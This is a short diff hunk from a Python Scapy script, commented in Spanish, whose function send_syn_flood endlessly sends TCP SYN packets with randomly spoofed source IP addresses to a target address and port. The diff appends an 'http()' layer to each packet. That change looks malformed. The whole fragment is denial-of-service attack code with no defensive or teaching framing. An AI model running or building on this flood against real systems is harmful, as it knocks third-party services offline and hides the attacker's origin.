@@ -13,7 +13,7 @@ def send_syn_flood(ip, port):
         while True:
             spoofed_ip = random_ip()
             # Crear el paquete SYN con IP de origen falsificada
-            syn_packet = IP(src=spoofed_ip, dst=ip) / TCP(dport=port, flags='S')
+            syn_packet = IP(src=spoofed_ip, dst=ip) / TCP(dport=port, flags='S') / http()
             send(syn_packet, verbose=False)
             print(f"Paquete SYN enviado desde {spoofed_ip} hacia {ip}:{port}")
             time.sleep(0.01)  # Pausa muy breve entre envíos para evitar sobrecargar el script
